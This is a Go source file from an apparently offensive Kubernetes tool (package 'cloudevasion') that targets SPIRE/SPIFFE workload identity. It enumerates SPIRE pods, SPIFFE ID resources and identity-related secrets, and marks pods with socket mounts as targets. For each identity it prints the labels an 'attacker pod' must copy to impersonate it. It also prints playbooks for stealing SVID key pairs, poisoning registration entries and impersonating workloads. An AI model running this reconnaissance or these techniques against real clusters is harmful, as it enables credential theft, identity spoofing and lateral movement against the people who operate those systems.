package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var cnativeIdentityIDGVR = schema.GroupVersionResource{
	Group: "spiffeid.spiffe.io", Version: "v1beta1", Resource: "spiffeids",
}

var clusterSPIFFEIDGVR = schema.GroupVersionResource{
	Group: "spire.spiffe.io", Version: "v1alpha1", Resource: "clusterspiffeids",
}

func detectCnativeIdentity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
	namespaces := []string{"spire", "spire-system", "spire-server"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=spire-server",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "cnative-identity",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d spire-server pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=spire-agent",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "cnative-identity",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d spire-agent pods", len(pods.Items)),
			}}
		}
	}

	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(ids.Items) > 0 {
		return []DetectionSystem{{
			Name:     "cnative-identity",
			Detected: true,
			Details:  fmt.Sprintf("%d SPIFFE ID CRDs found", len(ids.Items)),
		}}
	}

	return nil
}

// ExploitCnativeIdentity executes the specified cnative-identity exploitation technique.
func ExploitCnativeIdentity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return cnativeIdentityEnumerate(ctx, client, dynClient)
	case "steal_svid":
		return cnativeIdentityStealSVID(ctx, client)
	case "poison_entries":
		return cnativeIdentityPoisonEntries(ctx, dynClient)
	case "impersonate":
		return cnativeIdentityImpersonate(ctx, client, dynClient)
	default:
		return cnativeIdentityEnumerate(ctx, client, dynClient)
	}
}

func cnativeIdentityEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cnative-identity Enumeration:\n\n")

	namespaces := []string{"spire", "spire-system", "spire-server"}
	found := false
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err != nil || len(pods.Items) == 0 {
			continue
		}
		found = true
		for _, pod := range pods.Items {
			fmt.Fprintf(&sb, "  Pod: %s/%s (phase=%s)\n", ns, pod.Name, pod.Status.Phase)
		}
	}

	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(ids.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "\n  SPIFFE IDs (%d):\n", len(ids.Items))
		for _, id := range ids.Items {
			name := id.GetName()
			ns := id.GetNamespace()
			spec, _ := id.Object["spec"].(map[string]any)
			spiffeID, _ := spec["spiffeId"].(string)
			fmt.Fprintf(&sb, "    %s/%s → %s\n", ns, name, spiffeID)
		}
	}

	clusterIDs, err := dynClient.Resource(clusterSPIFFEIDGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(clusterIDs.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "\n  ClusterSPIFFEIDs (%d):\n", len(clusterIDs.Items))
		for _, id := range clusterIDs.Items {
			fmt.Fprintf(&sb, "    %s\n", id.GetName())
		}
	}

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if err == nil {
		cnativeIdentitySecrets := 0
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "spire") || strings.Contains(s.Name, "spiffe") {
				cnativeIdentitySecrets++
				if cnativeIdentitySecrets <= 5 {
					fmt.Fprintf(&sb, "  Secret: %s/%s (type=%s)\n", s.Namespace, s.Name, s.Type)
				}
			}
		}
		if cnativeIdentitySecrets > 5 {
			fmt.Fprintf(&sb, "  ... and %d more cnative-identity secrets\n", cnativeIdentitySecrets-5)
		}
	}

	if !found {
		sb.WriteString("  No cnative-identity components detected\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func cnativeIdentityStealSVID(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("SPIFFE SVID Theft:\n\n")

	sb.WriteString("  cnative-identity agents expose the Workload API via Unix domain socket.\n")
	sb.WriteString("  Default path: /run/spire/sockets/agent.sock\n\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		Limit: 100,
	})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list pods: %v\n", err)
		return &EvasionResult{Technique: "steal_svid", Success: false, Output: sb.String()}, nil
	}

	socketPods := 0
	for _, pod := range pods.Items {
		for _, container := range pod.Spec.Containers {
			for _, vm := range container.VolumeMounts {
				if strings.Contains(vm.MountPath, "spire") || strings.Contains(vm.MountPath, "spiffe") {
					socketPods++
					if socketPods <= 5 {
						fmt.Fprintf(&sb, "  [TARGET] %s/%s container=%s mount=%s\n",
							pod.Namespace, pod.Name, container.Name, vm.MountPath)
					}
				}
			}
		}
	}

	if socketPods > 5 {
		fmt.Fprintf(&sb, "  ... %d total pods with SPIRE socket mounts\n", socketPods)
	}

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "svid") || (strings.Contains(s.Name, "spire") && s.Type == "kubernetes.io/tls") {
				fmt.Fprintf(&sb, "  [SVID SECRET] %s/%s type=%s\n", s.Namespace, s.Name, s.Type)
			}
		}
	}

	sb.WriteString("\n  SVID theft techniques:\n")
	sb.WriteString("    1. Access Workload API socket at /run/spire/sockets/agent.sock\n")
	sb.WriteString("    2. Call FetchX509SVID() to get current SVID key pair\n")
	sb.WriteString("    3. Extract SVID from mounted secrets (kubernetes.io/tls)\n")
	sb.WriteString("    4. Read trust bundle from /run/spire/bundle/bundle.crt\n")
	sb.WriteString("    5. Use stolen SVID to authenticate as workload identity\n")

	return &EvasionResult{
		Technique: "steal_svid",
		Success:   socketPods > 0,
		Output:    sb.String(),
	}, nil
}

func cnativeIdentityPoisonEntries(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cnative-identity Registration Entry Poisoning:\n\n")

	sb.WriteString("  cnative-identity registration entries map workload selectors to SPIFFE IDs.\n")
	sb.WriteString("  Creating rogue entries grants our workload a trusted identity.\n\n")

	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list SPIFFE IDs: %v\n", err)
		sb.WriteString("  SPIFFE CRDs may not be installed\n")
		return &EvasionResult{Technique: "poison_entries", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  Existing SPIFFE ID entries (%d):\n", len(ids.Items))
	for _, id := range ids.Items {
		spec, _ := id.Object["spec"].(map[string]any)
		spiffeID, _ := spec["spiffeId"].(string)
		parentID, _ := spec["parentId"].(string)
		fmt.Fprintf(&sb, "    %s → parent=%s\n", spiffeID, parentID)

		if selector, ok := spec["selector"].(map[string]any); ok {
			fmt.Fprintf(&sb, "      selector: %v\n", selector)
		}
	}

	sb.WriteString("\n  Poisoning strategies:\n")
	sb.WriteString("    1. Create ClusterSPIFFEID with broad selector matching our pod\n")
	sb.WriteString("    2. Add label to our pod matching an existing SPIFFE ID selector\n")
	sb.WriteString("    3. Modify existing SPIFFEID spec to broaden selector match\n")
	sb.WriteString("    4. Create entry with same SPIFFE ID as target workload\n")
	sb.WriteString("    5. Inject DNS name SANs into SVID for service impersonation\n")

	return &EvasionResult{
		Technique: "poison_entries",
		Success:   len(ids.Items) > 0,
		Output:    sb.String(),
	}, nil
}

func cnativeIdentityImpersonate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cnative-identity Impersonation:\n\n")

	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot enumerate SPIFFE IDs: %v\n", err)
		return &EvasionResult{Technique: "impersonate", Success: false, Output: sb.String()}, nil
	}

	sb.WriteString("  Workload selectors determine which pods get which SPIFFE ID.\n")
	sb.WriteString("  If we match a selector, cnative-identity issues us that workload's identity.\n\n")

	targets := 0
	for _, id := range ids.Items {
		spec, _ := id.Object["spec"].(map[string]any)
		spiffeID, _ := spec["spiffeId"].(string)

		if selector, ok := spec["selector"].(map[string]any); ok {
			targets++
			fmt.Fprintf(&sb, "  Target identity: %s\n", spiffeID)
			fmt.Fprintf(&sb, "    Selector: %v\n", selector)

			if matchLabels, ok := selector["matchLabels"].(map[string]any); ok {
				sb.WriteString("    To impersonate: add labels ")
				for k, v := range matchLabels {
					fmt.Fprintf(&sb, "%s=%v ", k, v)
				}
				sb.WriteString("to attacker pod\n")
			}
			sb.WriteString("\n")
		}
	}

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app=spire-agent",
	})
	if err == nil && len(pods.Items) > 0 {
		sb.WriteString("  SPIRE agent node attestation:\n")
		for _, pod := range pods.Items {
			fmt.Fprintf(&sb, "    Agent: %s/%s node=%s\n", pod.Namespace, pod.Name, pod.Spec.NodeName)
		}
	}

	sb.WriteString("\n  Impersonation techniques:\n")
	sb.WriteString("    1. Match workload selector labels → cnative-identity issues SVID automatically\n")
	sb.WriteString("    2. Deploy pod in same namespace/service account as target\n")
	sb.WriteString("    3. Use node attestation — pods on same node share agent trust\n")
	sb.WriteString("    4. Modify target's SPIFFE ID CRD to include broader selectors\n")
	sb.WriteString("    5. Create duplicate registration with same SPIFFE ID, different selector\n")

	return &EvasionResult{
		Technique: "impersonate",
		Success:   targets > 0,
		Output:    sb.String(),
	}, nil
}
